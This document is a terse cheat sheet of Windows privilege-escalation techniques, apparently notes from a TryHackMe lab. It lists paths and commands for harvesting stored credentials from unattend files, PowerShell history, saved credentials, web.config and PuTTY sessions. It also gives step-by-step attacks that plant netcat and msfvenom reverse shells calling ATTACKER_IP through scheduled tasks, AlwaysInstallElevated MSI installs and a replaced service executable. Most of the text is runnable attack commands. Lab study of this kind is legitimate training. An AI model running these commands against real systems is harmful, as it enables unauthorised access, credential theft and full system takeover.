Windows Privilege Escalation (A TryHackMe Challenge: for Educational Purposes only) 

via Windows Installation

1. Check in the following paths and look for credentials in the <Password></Password> section
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml


via Powershell History

1. type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 

via Saved Windows Credentials

1. cmdkey /list will output all saved credentials on the instance
2. runas /savecred /user:admin cmd.exe to spin up a shell as the user

via IIS conf

1. Check the following paths (usually found in database connection strings)
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

via Putty

1. reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s (if users store their sessions there)

via Scheduled Tasks

1. schtasks /query /tn vulntask /fo list /v to list existing scheduled tasks
2. icacls c:\tasks\<script_name> to check file permissions
3. If file is editable, C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\<script_name>
4. Start listner on attacker's machine nc -nlvp 4444
5. Run the task on the target machine C:\> schtasks /run /tn vulntask 

via AlwaysInstallElevated

1. query these
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
2. (Attacker machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
3. (Target machine) C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi


via Insecure Permissions on Service Executable (vulnerability found on Splinterware System Scheduler)

1. sc qc WindowsScheduler to check path name and service start name
2. icacls C:\PROGRA~2\SYSTEM~1\WService.exe check permissions
3. (Attacker Machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe to generate payload
4. (Attacker Machine) python -m http.server to serve the payload
5. wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe to download payload
6. cd C:\PROGRA~2\SYSTEM~1\
7. move WService.exe WService.exe.bkp (test/replace the executable)
8. move C:\Users\thm-unpriv\rev-svc.exe WService.exe (replace the executable with the payload)
9. icacls WService.exe /grant Everyone:F to grant permission to everyone
10. (Attacker Machine) nc -lvp 4445 to start listener
11. C:\> sc stop windowsscheduler and C:\> sc start windowsscheduler
12. this should spin up the reverse shell




